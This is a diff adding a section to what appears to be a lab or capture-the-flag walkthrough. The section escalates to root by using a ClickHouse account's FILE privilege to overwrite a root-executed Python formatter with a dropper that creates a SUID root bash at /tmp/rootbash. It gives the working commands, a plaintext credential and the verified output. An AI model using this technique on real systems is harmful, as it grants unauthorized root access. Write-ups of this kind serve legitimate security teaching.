@@ -1487,6 +1487,68 @@ GRANT CHECK, SHOW, SELECT, INSERT, ALTER, CREATE, DROP, ..., FILE, URL, REMOTE, 
 ```
 
 Key finding: the credential authenticates as `default` and the grant list includes `FILE`. ClickHouse can therefore write the root-executed formatter through `file()`, so overwriting `aidx_quarantine.py` with attacker Python yields root.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 5.5 Hijack the Formatter for Root Execution
+
+Overwrite the root-executed formatter with attacker Python, then push a message onto the DLQ so the next timer tick runs it as root.
+
+#### 5.5.1 Overwrite the formatter via ClickHouse file()
+
+Write a Python dropper into `aidx_quarantine.py` using the `default` account's `FILE` privilege. The payload copies `/bin/bash` to `/tmp/rootbash` and sets it root-owned and SUID, so any user can then spawn a root shell. `LineAsString` writes one row per line; `engine_file_truncate_on_insert=1` replaces the file.
+
+**Command:**
+
+```bash
+clickhouse-client --host 127.0.0.1 --user default --password 'N3v3rs33nD4T4' -q "
+INSERT INTO TABLE FUNCTION file('aidx_quarantine.py','LineAsString')
+SETTINGS engine_file_truncate_on_insert=1
+VALUES
+('#!/usr/bin/env python3'),
+('import os, shutil, sys'),
+('try:'),
+('    sys.stdin.buffer.read()'),
+('except Exception:'),
+('    pass'),
+('shutil.copy(\"/bin/bash\", \"/tmp/rootbash\")'),
+('os.chown(\"/tmp/rootbash\", 0, 0)'),
+('os.chmod(\"/tmp/rootbash\", 0o4755)')
+"
+
+clickhouse-client --host 127.0.0.1 --user default --password 'N3v3rs33nD4T4' -q "SELECT * FROM file('aidx_quarantine.py','LineAsString')"
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `INSERT INTO TABLE FUNCTION file('aidx_quarantine.py','LineAsString')` | Target the formatter | Writes to the exact file the root drainer executes, relative to `user_files`. |
+| `SETTINGS engine_file_truncate_on_insert=1` | Replace contents | Truncates the existing file so only the payload remains. |
+| `VALUES ('...'),('...')` | Payload lines | Each row becomes one line of the Python dropper. |
+| `shutil.copy("/bin/bash","/tmp/rootbash"); chown 0,0; chmod 0o4755` | SUID root bash | Leaves a root-owned, SUID copy of bash at `/tmp/rootbash`. |
+| second query | Verify | Reads the file back to confirm the payload was written. |
+
+**Result:**
+
+```shell
+#!/usr/bin/env python3
+import os, shutil, sys
+try:
+    sys.stdin.buffer.read()
+except Exception:
+    pass
+shutil.copy("/bin/bash", "/tmp/rootbash")
+os.chown("/tmp/rootbash", 0, 0)
+os.chmod("/tmp/rootbash", 0o4755)
+```
+
+Key finding: the root-executed formatter now contains the dropper. The next DLQ message processed by the root timer will create a SUID root bash at `/tmp/rootbash`.
+
 
 
 
